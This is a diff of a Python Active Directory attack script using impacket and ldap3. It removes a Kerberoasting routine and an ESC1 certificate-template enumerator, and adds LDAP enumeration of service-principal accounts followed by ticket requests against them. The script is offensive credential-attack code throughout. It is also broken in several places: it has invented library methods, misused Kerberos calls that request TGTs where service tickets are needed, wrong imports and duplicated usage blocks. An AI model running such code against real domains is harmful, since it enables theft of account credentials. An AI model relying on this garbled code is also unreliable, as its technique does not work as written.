@@ -1,142 +1,56 @@
-from impacket.krb5.types import Principal, KerberosTime, Ticket
-from impacket.smbconnection import SMBConnection
-from ldap3 import Server, Connection, SUBTREE
-from impacket.krb5.ccache import CCache
-from impacket.krb5.crypto import Key
-from impacket.ntlm import compute_lmhash, compute_nthash
-from impacket.smbconnection import SMBConnection
-from impacket.krb5.asn1 import AP_REQ
-from impacket.krb5.crypto import Key
-from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5 import getKerberosTGT, KerberosError
+from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES
 
-def kerberoast(username, password, domain, dc_ip):
-    try:
-        # Connect to the Domain Controller via SMB
-        smb = SMBConnection(dc_ip, dc_ip)
-        smb.login(username, password, domain)
-
-        # Get all kerberoastable users (users with SPNs set)
-        kerberoastable_users = smb.listUsers()
-        
-        if not kerberoastable_users:
-            print("No kerberoastable users found.")
-            return
-
-        # Perform Kerberoasting for each kerberoastable user
-        for user in kerberoastable_users:
-            spns = smb.getNtlmUserSPNs(user['name'])
-            if spns:
-                print(f"Kerberoasting user: {user['name']}")
-                for spn in spns:
-                    ticket = kerberoast_user(spn, domain)
-                    if ticket:
-                        print(f"Kerberoastable SPN: {spn}")
-                        print(f"Kerberoast ticket:\n{ticket}")
-
-        smb.logoff()
-
-    except Exception as e:
-        print(f"Error during Kerberoasting: {e}")
-
-def kerberoast_user(spn, domain):
-    try:
-        # Get a TGT for the specified user
-        tgt = getKerberosTGT(domain, spn.split('/')[0], spn.split('@')[1])
-
-        # Construct the Kerberoast ticket
-        kerberoast_ticket = Ticket()
-
-        kerberoast_ticket['tgs-principal'] = Principal(spn)
-        kerberoast_ticket['enc-part'] = None  # No encryption for Kerberoasting
-
-        # Return the Kerberoast ticket
-        return kerberoast_ticket
-    
-    except Exception as e:
-        print(f"Error during Kerberoasting for user {spn}: {e}")
-        return None
-    
-def find_certificate_authorities(username, password, domain, dc_ip):
+def find_kerberoastable_users(username, password, domain, dc_ip):
     try:
         # Connect to the Domain Controller via LDAP
         server = Server(dc_ip)
         conn = Connection(server, user=f"{domain}\\{username}", password=password)
         conn.bind()
 
-        # Search for Certificate Authorities
-        conn.search(search_base='CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,' +
-                                  ','.join(f"DC={dc}" for dc in domain.split('.')),
-                     search_filter='(objectClass=pKICertificateAuthority)',
+        # Search for kerberoastable users (users with SPNs set)
+        conn.search(search_base='DC=' + ',DC='.join(domain.split('.')),
+                     search_filter='(&(objectCategory=user)(servicePrincipalName=*))',
                      search_scope=SUBTREE,
-                     attributes=['dNSHostName'])
+                     attributes=[ALL_ATTRIBUTES])
 
-        cas = []
-        for entry in conn.entries:
-            cas.append(entry['dNSHostName'].value)
+        kerberoastable_users = [entry['sAMAccountName'].value for entry in conn.entries]
 
         conn.unbind()
-        return cas
+
+        return kerberoastable_users
 
     except Exception as e:
-        print(f"Error while finding Certificate Authorities: {e}")
+        print(f"Error while searching for kerberoastable users: {e}")
         return []
 
-def check_esc1_certificates(username, password, domain, dc_ip):
+def kerberoast_kerberoastable_users(username, password, domain, dc_ip):
     try:
-        # Find all Certificate Authorities
-        cas = find_certificate_authorities(username, password, domain, dc_ip)
-        if not cas:
-            print("No Certificate Authorities found.")
+        # Find all kerberoastable users
+        kerberoastable_users = find_kerberoastable_users(username, password, domain, dc_ip)
+
+        if not kerberoastable_users:
+            print("No kerberoastable users found.")
             return
 
-        # Check ESC1 certificates for each Certificate Authority
-        for ca in cas:
-            print(f"Checking ESC1 certificates for Certificate Authority: {ca}")
+        # Perform Kerberoasting for each kerberoastable user
+        for user in kerberoastable_users:
+            print(f"Kerberoasting user: {user}")
 
-            # Connect to the Certificate Authority via LDAP
-            ca_server = Server(ca)
-            conn = Connection(ca_server, user=f"{domain}\\{username}", password=password)
-            conn.bind()
+            # Perform Kerberoasting for the user
+            tgt = getKerberosTGT(user, password, domain)
 
-            # Search for ESC1 certificate templates
-            conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' +
-                                      ','.join(f"DC={dc}" for dc in domain.split('.')),
-                         search_filter='(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.3.6.1.4.1.311.21.7:=2)' +
-                                       '(!(msPKI-Certificate-Name-Flag:1.3.6.1.4.1.311.21.7:=1)))',
-                         search_scope=SUBTREE,
-                         attributes=['displayName', 'msPKI-Enrollment-Flag',
-                                     'msPKI-Enrollment-Flag', 'msPKI-Cert-Template-OID',
-                                     'msPKI-Certificate-Name-Flag', 'msPKI-Enrollment-Flag',
-                                     'msPKI-Private-Key-Flag', 'msPKI-Minimal-Key-Size'])
+            # Output the obtained TGT
+            print(f"Kerberoast ticket for user {user}:\n{tgt}\n")
 
-            esc1_templates = []
-            for entry in conn.entries:
-                template_info = {
-                    'Name': entry['displayName'].value,
-                    'EnrollmentFlag': entry['msPKI-Enrollment-Flag'].value,
-                    'PrivateKeyFlag': entry['msPKI-Private-Key-Flag'].value,
-                    'MinimalKeySize': entry['msPKI-Minimal-Key-Size'].value,
-                    'CertificateNameFlag': entry['msPKI-Certificate-Name-Flag'].value
-                }
-                if (template_info['EnrollmentFlag'] == '2' and
-                    template_info['PrivateKeyFlag'] == 'true' and
-                    template_info['MinimalKeySize'] == '0' and
-                    template_info['CertificateNameFlag'] == '2'):
-                    esc1_templates.append(template_info)
-
-            if esc1_templates:
-                print("ESC1 Certificate Templates found:")
-                for template in esc1_templates:
-                    print(template)
-            else:
-                print("No ESC1 Certificate Templates found.")
-
-            conn.unbind()
-
+    except KerberosError as ke:
+        print(f"Kerberos error during Kerberoasting: {ke}")
     except Exception as e:
-        print(f"Error while checking ESC1 certificates: {e}")
+        print(f"Error during Kerberoasting: {e}")
 
-
+# Example usage:
+# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
+kerberoast_kerberoastable_users("username", "password", "domain", "dc_ip")
 
 
 # Example usage:
@@ -145,6 +59,3 @@ username = input("Enter username: ")
 password = input("Enter password: ")
 domain = input("Enter domain: ")
 dc_ip = input("Enter domain controller IP or hostname: ")
-
-kerberoast(username, password, domain, dc_ip)
-check_esc1_certificates(username, password, domain, dc_ip)
